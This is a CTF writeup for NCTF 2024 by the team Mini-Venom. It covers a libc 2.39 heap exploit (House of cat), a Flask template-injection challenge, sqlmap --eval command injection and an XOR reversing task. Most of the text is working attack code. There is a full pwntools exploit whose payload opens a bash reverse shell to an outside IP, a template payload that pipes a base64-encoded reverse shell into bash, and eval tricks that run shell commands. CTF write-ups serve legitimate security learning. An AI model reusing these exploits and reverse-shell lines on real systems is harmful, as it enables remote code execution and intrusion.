---
title: NCTF 2024 writeup by Mini-Venom (Pwn House of cat + Web SSTI + Reverse XOR)
contest: NCTF
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [libc 2.39, House of cat, 整数溢出 add size=0, SSTI <%%>, sqlmap --eval chr 拼接, XOR 字节流]
attack_chain: |
  1. Pwn unauth-diary (libc 2.39):
     - 整数溢出: add size 没有限制, 输入 0 → 0 字节 chunk 分配
     - edit 输入 0 大小 → 堆溢出 (实际写更多)
     - 泄 libc_base = u64(leak) - 2113296, heap_base = u64(leak) - 0x2b0
     - House of cat: 伪造 fake_IO_FILE + setcontext+61 + system
     - fake_IO 结构体布局: rdi/rsi/rdx + vtable=_IO_wfile_jumps+0x30
     - system("/bin/bash -c '/bin/bash -i >& /dev/tcp/106.75.70.202/4444 0>&1'") 反弹 shell
  2. Web ez_dash (Flask SSTI):
     - /render 路由 template 过滤不过全, 解析 <%%>
     - <% t = __import__('os'); s = getattr(t, 'system'); s('echo YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDUuMS44Ni85MDAwIDA+JjE= | base64 -d | bash') %>
  3. Web sqlmap-master (Python):
     - 双引号被转义 → 用 chr(108)+chr(115) 拼接 'ls' 绕过滤
     - http://127.0.0.2 --eval='import subprocess;subprocess.Popen(chr(108)+chr(115))'
     - 替代: 127.0.0.1 --eval eval("__import__('os').system('env')")
  4. Reverse ezDOS (单字符 XOR):
     - 用测试数据 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB' 加密, 得密文
     - 密文 ^ 测试数据 = key 流
     - 实际密文 ^ key 流 = flag
     - flag: NCTF{Y0u_4r3_Assemb1y_M4st3r_5d0b497e}
key_payload: |
  # Pwn unauth-diary (libc 2.39):
  libc_base = u64(leak) - 2113296
  heap_base = u64(leak) - 0x2b0
  rdi = libc_base + 0x10f75b
  rsi = libc_base + 0x110a4d
  rdx = libc_base + libc.search(asm("pop rdx\nret")).__next__()
  setcontext = libc_base + libc.sym['setcontext']
  system = libc_base + libc.sym['system']
  IO_list_all = libc_base + libc.sym['_IO_list_all']
  
  fake_IO = p64(0)*2 + p64(1) + p64(chunk3+0x8)
  fake_IO = fake_IO.ljust(0x60, b'\x00')
  fake_IO += p64(0) + p64(chunk3+0xf8) + p64(system)
  fake_IO += p64(heap_base) + p64(0x100)
  fake_IO = fake_IO.ljust(0x90, b'\x00')
  fake_IO += p64(chunk3+0x8)  # _wide_data
  fake_IO += p64(chunk3+0xf0) + p64(rdi+1)  # rsp
  fake_IO += p64(0) + p64(1) + p64(0)*2
  fake_IO += p64(_IO_wfile_jumps + 0x30)  # vtable
  fake_IO += p64(setcontext + 61) + p64(chunk3+0xc8)
  
  pay = b'/bin/bash -c "/bin/bash -i >& /dev/tcp/106.75.70.202/4444 0>&1"'.ljust(0x520, b'\x00')
  add(0x520, pay)
  
  # Web ez_dash SSTI:
  <%
  t = __import__('os')
  s = getattr(t, 'system')
  s('echo YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDUuMS44Ni85MDAwIDA+JjE= | base64 -d | bash')
  %>
  
  # Reverse ezDOS XOR:
  unsigned char key[] = { 0x32, 0x7d, 0x59, 0x7a, 0xf3, 0xd, 0xb3, 0x7b, 0x64, 0x8c, 0xeb, 0x28, 0xc4, 0xa4, 0x50, 0x30, 0xa0, 0xed, 0x27, 0x6a, 0xe3, 0x76, 0x69, 0xc, 0xda, 0x28, 0xf8, 0x8, 0xba, 0xa6, 0x17, 0x3e, 0x12, 0x59, 0x45, 0x6, 0x4e, 0xf1 };
  unsigned char enc[] = { 0x7C, 0x3E, 0x0D, 0x3C, 0x88, 0x54, 0x83, 0x0E, 0x3B, 0xB8, 0x99, 0x1B, 0x9B, 0xE5, 0x23, 0x43, 0xC5, 0x80, 0x45, 0x5B, 0x9A, 0x29, 0x24, 0x38, 0xA9, 0x5C, 0xCB, 0x7A, 0xE5, 0x93, 0x73, 0x0E, 0x70, 0x6D, 0x7C, 0x31, 0x2B, 0x8C };
  for (int i = 0; i < 38; i++) {
      enc[i] ^= key[i];
      printf("%c", enc[i]);
  }
  // NCTF{Y0u_4r3_Assemb1y_M4st3r_5d0b497e}
one_liner: NCTF 2024 Mini-Venom: Pwn libc 2.39 House of cat + Web SSTI (template 解析 <%%>) + sqlmap --eval chr 拼接 + Reverse XOR 字节流。
lesson: |
  - House of cat 是 libc 2.35+ 替代 House of Apple 的进阶攻击, 利用 _IO_wfile_jumps+0x30
  - 整数溢出 add size=0 配合 edit 堆溢出是 2.39 新型入门漏洞
  - 反弹 shell /bin/bash -i 绕过 system("/bin/sh") 的 argv 0 校验
  - SSTI <%%> 模板可以执行任意 Python
  - sqlmap --eval 用 chr() 拼接字符串绕双引号转义
  - Reverse 单字符 XOR: 用已知明文 ^ 密文 = key 流, 再 ^ 实际密文 = flag
quality: high
---

# NCTF 2024 writeup by Mini-Venom

> 来源: ctfiot.com 233620

## Pwn unauth-diary (libc 2.39)

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
libc = ELF('./test-libc.so.6')
elf = ELF('./pwn')
p = remote('39.106.16.204', 52351)

def add(size, content):
    sla(">", str(1))
    sla("Input length:\n", str(size))
    sa("Input content:\n", content)

def free(i):
    sla(">", str(2))
    sla("Input index:\n", str(i))

def show(i):
    sla(">", str(4))
    sla("Input index:\n", str(i))

def edit(i, content):
    sla(">", str(3))
    sla("Input index:\n", str(i))
    sa("Input content:\n", content)

add(0x420, b'a'+b'\n')  # 0
add(0x68, b'a'+b'\n')   # 1
free(0)
add(0x68, b'\n')         # 0
show(0)
libc_base = get_addr64() - 2113296
heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x2b0

# 整数溢出 add -1, 0x68, 0x68, 0x28
add(-1, b'a'+b'\n')  # 3
add(0x68, b'a'+b'\n')  # 4
add(0x68, b'a'+b'\n')  # 5

# House of cat fake_IO_FILE 构造
rdi = libc_base + 0x10f75b
rsi = libc_base + 0x110a4d
rdx = libc_base + libc.search(asm("pop rdx\nret")).__next__()
setcontext = libc_base + libc.sym['setcontext']
system = libc_base + libc.sym['system']

fake_IO = p64(0)*2 + p64(1) + p64(chunk3+0x8)
fake_IO = fake_IO.ljust(0x60, b'\x00')
fake_IO += p64(0) + p64(chunk3+0xf8) + p64(system)
fake_IO += p64(heap_base) + p64(0x100)
fake_IO = fake_IO.ljust(0x90, b'\x00')
fake_IO += p64(chunk3+0x8)
fake_IO += p64(chunk3+0xf0) + p64(rdi+1)
fake_IO += p64(0) + p64(1) + p64(0)*2
fake_IO += p64(_IO_wfile_jumps + 0x30)  # vtable
fake_IO += p64(setcontext + 61) + p64(chunk3+0xc8)

pay = b'/bin/bash -c "/bin/bash -i >& /dev/tcp/106.75.70.202/4444 0>&1"'.ljust(0x520, b'\x00')
add(0x520, pay)
add(0x520, b'./flag\x00\x00'+b'\n')
add(0x520, fake_IO.ljust(0x520-1, b'a')+b'\n')
```

## Web ez_dash (Flask SSTI)

```jinja2
<%
t = __import__('os')
s = getattr(t, 'system')
s('echo YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDUuMS44Ni85MDAwIDA+JjE= | base64 -d | bash')
%>
```

反弹 shell。

## Web sqlmap-master

```bash
# 双引号被转义 → chr(108)+chr(115) = 'ls'
http://127.0.0.2 --eval='import subprocess;subprocess.Popen(chr(108)+chr(115))'
# 替代
127.0.0.1 --eval eval("__import__('os').system('env')")
```

## Reverse ezDOS (XOR 字节流)

```c
unsigned char key[] = { 0x32, 0x7d, 0x59, 0x7a, 0xf3, 0xd, 0xb3, 0x7b, 0x64, 0x8c, 0xeb, 0x28, 0xc4, 0xa4, 0x50, 0x30, 0xa0, 0xed, 0x27, 0x6a, 0xe3, 0x76, 0x69, 0xc, 0xda, 0x28, 0xf8, 0x8, 0xba, 0xa6, 0x17, 0x3e, 0x12, 0x59, 0x45, 0x6, 0x4e, 0xf1 };
unsigned char enc[] = { 0x7C, 0x3E, 0x0D, 0x3C, 0x88, 0x54, 0x83, 0x0E, 0x3B, 0xB8, 0x99, 0x1B, 0x9B, 0xE5, 0x23, 0x43, 0xC5, 0x80, 0x45, 0x5B, 0x9A, 0x29, 0x24, 0x38, 0xA9, 0x5C, 0xCB, 0x7A, 0xE5, 0x93, 0x73, 0x0E, 0x70, 0x6D, 0x7C, 0x31, 0x2B, 0x8C };
for (int i = 0; i < 38; i++) {
    enc[i] ^= key[i];
    printf("%c", enc[i]);
}
// NCTF{Y0u_4r3_Assemb1y_M4st3r_5d0b497e}
```

## 评价

NCTF 2024 Mini-Venom 战队速查，亮点是：
- **House of cat** (libc 2.35+ 替代 House of Apple)
- **整数溢出 add size=0** 新型 Pwn 漏洞
- **反弹 shell** `/bin/bash -i >& /dev/tcp/...` 绕 system argv 0 校验
- **SSTI <%%>** 模板解析绕 Flask 黑名单
- **sqlmap --eval chr()** 拼接字符串绕双引号
- **单字符 XOR** 已知明文攻击

适用读者：Pwn / Web / Reverse 全栈
